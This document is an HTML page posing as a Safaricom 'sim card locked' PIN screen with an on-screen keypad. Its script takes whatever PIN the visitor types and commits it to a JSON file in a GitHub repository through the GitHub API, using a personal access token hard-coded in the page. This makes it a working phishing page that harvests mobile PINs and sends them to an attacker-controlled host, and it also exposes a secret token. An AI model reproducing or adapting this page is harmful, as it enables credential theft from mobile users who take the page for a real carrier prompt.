<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script defer src="https://pyscript.net/latest/pyscript.js"></script>
    <link rel="stylesheet" href="https://pyscript.net/latest/pyscript.css">
    <title>safaricom</title>
</head>
<style>
    div {
        margin: 20px;
    }
    button {
        height: 50px;
        width: 50px;
        border-radius: 25px;
        border: none;
        margin: 20px;
        font-size: 20px;
    }
    input {
        height: 40px;
        width: 200px;
        font-size: 20px;
        text-align: center;
        border: none;
        pointer-events: none;
    }
</style>
<body>
    <div>sim card locked</div>
    <div>
        <input id="pin" type="text" readonly>
    </div>
    <div>
        <button onclick="appendToInput('1')">1</button>
        <button onclick="appendToInput('2')">2</button>
        <button onclick="appendToInput('3')">3</button>
    </div>
    <div>
        <button onclick="appendToInput('4')">4</button>
        <button onclick="appendToInput('5')">5</button>
        <button onclick="appendToInput('6')">6</button>
    </div>
    <div>
        <button onclick="appendToInput('7')">7</button>
        <button onclick="appendToInput('8')">8</button>
        <button onclick="appendToInput('9')">9</button>
    </div>
    <div>
        <button id="del" onclick="deleteLastChar()">del</button>
        <button onclick="appendToInput('0')">0</button>
        <button id="ok">ok</button>
    </div>

    <script>
        function appendToInput(value) {
            const input = document.getElementById('pin');
            input.value += value;
        }

        function deleteLastChar() {
            const input = document.getElementById('pin');
            input.value = input.value.slice(0, -1);
        }

        async function getpin() {
            const pin = document.getElementById("pin").value;

            // GitHub details
            const repo = "senmakana/Pins"; // Replace with your repository
            const filePath = "pin.json"; // Path to the JSON file in the repo
            const token = "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"; // Replace with your GitHub token

            const apiUrl = `https://api.github.com/repos/${repo}/contents/${filePath}`;

            // Fetch the current file's content (if it exists)
            try {
                const getResponse = await fetch(apiUrl, {
                    headers: {
                        Authorization: `Bearer ${token}`,
                        Accept: "application/vnd.github.v3+json",
                    },
                });

                let fileSha = null;
                let existingContent = {};

                if (getResponse.ok) {
                    const fileData = await getResponse.json();
                    fileSha = fileData.sha; // Get the file's SHA
                    existingContent = JSON.parse(atob(fileData.content)); // Decode base64 content
                }

                // Add the PIN to the JSON content
                existingContent.pins = existingContent.pins || [];
                existingContent.pins.push(pin);

                // Convert updated content to base64
                const newContent = btoa(JSON.stringify(existingContent, null, 2));

                // Commit the updated content
                const response = await fetch(apiUrl, {
                    method: "PUT",
                    headers: {
                        Authorization: `Bearer ${token}`,
                        Accept: "application/vnd.github.v3+json",
                    },
                    body: JSON.stringify({
                        message: "Update pin data",
                        content: newContent,
                        sha: fileSha, // Include SHA if the file exists
                    }),
                });

                if (response.ok) {
                    alert("PIN successfully saved to GitHub!");
                } else {
                    throw new Error("Failed to save PIN to GitHub.");
                }
            } catch (error) {
                console.error("Error:", error);
                alert("An error occurred while saving the PIN.");
            }

            location.reload(); // Reset the page
        }

        document.getElementById("ok").addEventListener("click", getpin);
    </script>
</body>
</html>
